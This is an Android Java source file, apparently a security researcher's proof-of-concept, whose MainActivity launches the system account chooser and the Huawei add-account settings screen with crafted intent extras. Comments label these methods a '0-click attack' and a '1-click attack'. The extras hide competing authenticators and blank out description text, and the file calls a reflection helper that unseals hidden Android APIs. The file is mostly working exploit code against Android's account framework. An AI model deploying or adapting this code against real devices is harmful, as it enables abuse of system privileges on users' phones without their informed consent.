package com.wrlus.htest;

import androidx.appcompat.app.AppCompatActivity;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.accounts.AuthenticatorDescription;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import java.util.ArrayList;

import me.weishu.reflection.Reflection;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "HTest.Main";
    private static final String MY_ACCOUNT_TYPE = "com.wrlus.htest.ACCOUNT_TYPE";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        launchChooseTypeAndAccount();
    }

//    This method is an 0-click attack
    private void launchChooseTypeAndAccount() {
        Intent intent = new Intent();
        intent.setComponent(new ComponentName("android", "android.accounts.ChooseTypeAndAccountActivity"));
        ArrayList<Account> allowableAccounts = new ArrayList<>();
        allowableAccounts.add(new Account("点击就送", MY_ACCOUNT_TYPE));
        intent.putExtra("allowableAccounts", allowableAccounts);
        intent.putExtra("allowableAccountTypes", new String[] { MY_ACCOUNT_TYPE });
        Bundle options = new Bundle();
        options.putBoolean("alivePullStartUp", true);
        intent.putExtra("addAccountOptions", options);
        intent.putExtra("descriptionTextOverride", "     ");
        intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        startActivity(intent);
    }

//    This method is a 1-click attack
    private void launchAddAccountSettings() {
        Intent intent = new Intent("android.settings.ADD_ACCOUNT_SETTINGS");
        intent.addCategory(Intent.CATEGORY_DEFAULT);
        intent.putExtra("account_type", new String[] { MY_ACCOUNT_TYPE });
        intent.putExtra("selected_account", MY_ACCOUNT_TYPE);

        intent.putStringArrayListExtra("huawei.android.settings.extra.FILTER_OUT_ACCOUNTS",
                getFilterOutAccountsExtra());
        intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        startActivity(intent);
    }

    private ArrayList<String> getFilterOutAccountsExtra() {
        AccountManager accountManager = AccountManager.get(this);
        AuthenticatorDescription[] authenticatorDescriptions = accountManager.getAuthenticatorTypes();

        ArrayList<String> filterOutAccounts = new ArrayList<>();

        for (AuthenticatorDescription authenticatorDescription : authenticatorDescriptions) {
            if (!authenticatorDescription.type.equals(MY_ACCOUNT_TYPE)) {
                filterOutAccounts.add(authenticatorDescription.type);
            }
        }

        return filterOutAccounts;
    }

    @Override
    protected void attachBaseContext(Context newBase) {
        super.attachBaseContext(newBase);
        Reflection.unseal(newBase);
    }
}